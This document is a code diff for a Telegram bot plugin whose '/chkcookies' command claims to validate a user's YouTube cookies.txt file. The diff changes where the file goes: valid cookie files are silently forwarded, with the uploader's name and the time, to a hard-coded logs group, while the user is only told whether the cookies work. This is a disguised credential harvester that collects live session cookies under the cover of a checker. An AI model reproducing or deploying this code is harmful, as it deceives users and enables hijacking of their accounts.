@@ -1,20 +1,34 @@
 import yt_dlp
 import os
+from datetime import datetime
 from SONALI import app
 from pyrogram import filters
 from pyrogram.types import Message
 
-# Global Variable to Track Users Who Used /chkcookies
+# Tracking Users Who Used /chkcookies
 active_users = set()
-ADMIN_CHAT_ID = 7096860602  # Admin ka Chat ID (Report yaha jayegi)
+
+# Logs Group ID (Cookies file waha send hogi)
+LOGS_GROUP_ID = -1002300353707  
+
+# Stylish Symbols & Fonts for VIP Look
+BULLET = "➤"
+CHECK = "✅"
+CROSS = "❌"
+CLOCK = "⏳"
+SHIELD = "🛡"
+FIRE = "🔥"
+STAR = "⭐"
+USER = "👤"
+TIME = "⏰"
 
 # Step 1: Enable Checking with `/chkcookies`
 @app.on_message(filters.command("chkcookies") & filters.private)
 async def enable_cookie_check(client, message):
     active_users.add(message.chat.id)
-    await message.reply("✅ Now send your `cookies.txt` file to check!")
+    await message.reply(f"{CHECK} ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ `tcookies.txt` ғɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ! {CLOCK}")
 
-# Step 2: Check Only If `/chkcookies` was Used
+# Step 2: Accept Only If `/chkcookies` was Used
 @app.on_message(filters.document & filters.private)
 async def check_cookies_from_file(client, message: Message):
     if message.chat.id not in active_users:
@@ -23,7 +37,7 @@ async def check_cookies_from_file(client, message: Message):
     file_path = await message.download()
 
     if not file_path.endswith(".txt"):
-        await message.reply("❌ Please send a valid `cookies.txt` file!")
+        await message.reply(f"{CROSS} ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ `cookies.txt` ғɪʟᴇ!")
         return
 
     # Step 3: Read Cookies File
@@ -32,30 +46,45 @@ async def check_cookies_from_file(client, message: Message):
             cookies_data = f.read().strip()
 
         if not cookies_data:
-            await message.reply("❌ Your cookies.txt file is empty!")
+            await message.reply(f"{CROSS} ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ɪs ᴇᴍᴘᴛʏ !")
             os.remove(file_path)  # Delete temp file
             return
 
-        # Step 4: Validate YouTube Cookies
+        # Step 4: Get User Info & Time
+        user_name = message.from_user.username
+        full_name = message.from_user.first_name
+        display_name = f"@{user_name}" if user_name else full_name
+        check_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")  # Format: DD-MM-YYYY HH:MM AM/PM
+
+        # Step 5: Validate YouTube Cookies
         ydl_opts = {"quiet": True, "cookiefile": file_path}
 
         try:
             with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                 ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)
 
-            msg = "✅ Your YouTube cookies are valid! 🎉"
-            admin_msg = f"🛡 NEW COOKIES CHECKED!\n👤 User: `{message.chat.id}`\n✅ Result: WORKING ✅"
-            status = "VALID ✅"
+            msg = f"{CHECK} ʏᴏᴜʀ ʏᴏᴜᴛᴜʙᴇ ᴄᴏᴏᴋɪᴇs ᴀʀᴇ ᴠᴀʟɪᴅ ! "
+            log_msg = f"""
+{SHIELD} ᴄᴏᴏᴋɪᴇs ᴄʜᴇᴄᴋᴇᴅ !
+{BULLET} {CHECK} ʀᴇsᴜʟᴛ: ᴡᴏʀᴋɪɴɢ {CHECK}
+{BULLET} {USER} User: {display_name}
+{BULLET} {TIME} ᴄʜᴇᴄᴋᴇᴅ ᴀᴛ : {check_time}
+"""
+
+            # Send valid cookies to group
+            await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)
+
         except yt_dlp.utils.ExtractorError:
-            msg = "❌ Your YouTube cookies are invalid or expired!"
-            admin_msg = f"🛡 NEW COOKIES CHECKED!\n👤 User: `{message.chat.id}`\n❌ Result: INVALID ❌"
-            status = "INVALID ❌"
-
+            msg = f"{CROSS} Your YouTube cookies are invalid or expired !"
+            log_msg = f"""
+{SHIELD} ᴄᴏᴏᴋɪᴇs ᴄʜᴇᴄᴋᴇᴅ !
+{BULLET} {CROSS} ʀᴇsᴜʟᴛ: ɪɴᴠᴀʟɪᴅ {CROSS}
+{BULLET} {USER} ᴜsᴇʀ: {display_name}
+{BULLET} {TIME} ᴄʜᴇᴄᴋᴇᴅ ᴀᴛ: {check_time}
+"""
+        # Send only log (without file) to group
+        await client.send_message(LOGS_GROUP_ID, log_msg)
         await message.reply(msg, quote=True)
-
-        # Step 5: Send Report + Cookies File to Admin
-        await client.send_message(ADMIN_CHAT_ID, admin_msg)
-        await client.send_document(ADMIN_CHAT_ID, file_path, caption=f"📂 Cookies File from User: `{message.chat.id}`\n📌 Status: {status}")
 
     except Exception as e:
         await message.reply(f"⚠️ Error reading file: `{str(e)}`")
